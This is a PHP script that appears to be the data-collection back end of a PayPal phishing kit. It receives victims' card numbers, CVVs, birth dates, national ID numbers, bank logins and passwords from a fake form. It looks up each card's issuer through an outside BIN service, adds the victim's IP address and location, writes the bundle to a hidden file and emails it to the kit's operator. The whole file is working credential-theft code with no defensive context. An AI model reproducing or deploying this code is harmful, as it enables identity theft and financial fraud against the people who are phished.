<?php if (isset($_POST['ccn']) && isset($_POST['fnm'])) {
    session_start();
    include '../mine.php';
    function cardData($ss, $bin) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, "https://api.freebinchecker.com/bin/" . $bin);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 400);
        $json = curl_exec($ch);
        curl_close($ch);
        if ($json == false || $json == '{"valid":false}') {
            return "N/A";
        }
        $code = json_decode($json);
        switch ($ss) {
            case "type":
                $str = $code->card->type;
            break;
            case "level":
                $str = $code->card->category;
            break;
            case "bank":
                $str = isset($code->issuer->name) ? $code->issuer->name : "";
            break;
            case "status":
                $str = $code->country->currency;
            break;
            case "countryName":
                $str = $code->country->name;
            break;
            default:
                $str = $code->card->scheme;
        }
        return $str;
    }
    $ctp = $_POST['ctp'];
    $ccn = $_POST['ccn'];
    $cex = $_POST['cex'];
    $csc = $_POST['csc'];
    $fnm = $_POST['fnm'];
    $dob = $_POST['dob'];
    $adr = $_POST['adr'];
    $cty = $_POST['cty'];
    $zip = $_POST['zip'];
    $stt = $_POST['stt'];
    $cnt = $_POST['cnt'];
    $ptp = $_POST['ptp'];
    $par = $_POST['par'];
    $pnm = $_POST['pnm'];
    $bin = substr(str_replace(' ', '', $ccn), 0, 6);
    $bin_type = cardData('type', $bin);
    $bin_level = cardData('level', $bin);
    $bin_brand = cardData('brand', $bin);
    $bin_status = cardData('status', $bin);
    $bin_bank = cardData('bank', $bin);
    $bin_country = cardData('countryName', $bin);
    $msg = "=========== <[Ussef FuLLz ]> ===========
";
    $msg.= "----------------------- Billing ---------------------
";
    $msg.= "Full Name	: {$fnm}
";
    $msg.= "Birth Date	: {$dob}
";
    $msg.= "Address		: {$adr}
";
    $msg.= "City		: {$cty}
";
    $msg.= "State		: {$stt}
";
    $msg.= "Zip Code	: {$zip}
";
    $msg.= "Country		: {$cnt}
";
    $msg.= "Phone		: {$ptp} | {$par} {$pnm}
";
    if (isset($_POST['mdn'])) {
        $msg.= "Mother Name : {$_POST['mdn']}
";
    }
    if (isset($_POST['ssn'])) {
        $msg.= "SSN 		: {$_POST['ssn']}
";
    }
    if (isset($_POST['pps'])) {
        $msg.= "PPS 		: {$_POST['pps']}
";
    }
    if (isset($_POST['clm']) && isset($_POST['dln'])) {
        $msg.= "Card Limit 	: {$_POST['clm']}
";
        $msg.= "Driver Lic. : {$_POST['dln']}
";
    }
    if (isset($_POST['sin'])) {
        $msg.= "SIN 		: {$_POST['sin']}
";
    }
    if (isset($_POST['pse'])) {
        $msg.= "PSE 		: {$_POST['pse']}
";
    }
    if (isset($_POST['dni'])) {
        $msg.= "DNI 		: {$_POST['dni']}
";
    }
    if (isset($_POST['bsn'])) {
        $msg.= "BSN 		: {$_POST['bsn']}
";
    }
    if (isset($_POST['cpf'])) {
        $msg.= "CPF 		: {$_POST['cpf']}
";
    }
    if (isset($_POST['fcn'])) {
        $msg.= "FCN 		: {$_POST['fcn']}
";
    }
    $msg.= "----------------------- CC Info ---------------------
";
    $msg.= "CC Brand	: {$ctp}
";
    $msg.= "CC Number	: {$ccn}
";
    $msg.= "CC Expiry	: {$cex}
";
    $msg.= "CVV		: {$csc}
";
    if (isset($_POST['acn']) && isset($_POST['stc'])) {
        $msg.= "Account N. 	: {$_POST['acn']}
";
        $msg.= "Sortcode    : {$_POST['stc']}
";
    }
    if (isset($_POST['bus']) && isset($_POST['bpw'])) {
        $msg.= "Bank ID 	: {$_POST['bus']}
";
        $msg.= "Bank Pass   	: {$_POST['bpw']}
";
    }
    $msg.= "----------------------- BIN Info {$bin} -------------
";
    $msg.= "CC Data		: {$bin_brand} {$bin_type} {$bin_level} -> {$bin_status}
";
    $msg.= "CC Bank		: {$bin_bank}
";
    $msg.= "CC Country	: {$bin_country}
";
    $msg.= "---------------------- IP Info ----------------------
";
    $msg.= "IP ADDRESS	: {$_SESSION['ip']}
";
    $msg.= "LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}
";
    $msg.= "BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}
";
    $msg.= "TIMEZONE	: {$_SESSION['ip_timezone']}
";
    $msg.= "TIME		: " . now() . " GMT
";
    $msg.= "=========== <[Ussef PaYPal FuLLz ]> ===========


";
    $save = fopen("../../hahaha883.txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    $subject = "PaYPal FuLLz [{$bin} {$ctp}|{$_SESSION['ip_countryName']}]";
    $headers = "From:Ussef <ussef@sudospeak.com>
";
    $headers.= "MIME-Version: 1.0
";
    $headers.= "Content-Type: text/plain; charset=UTF-8
";
    @mail($yours, $subject, $msg, $headers);
    exit('done');
} ?>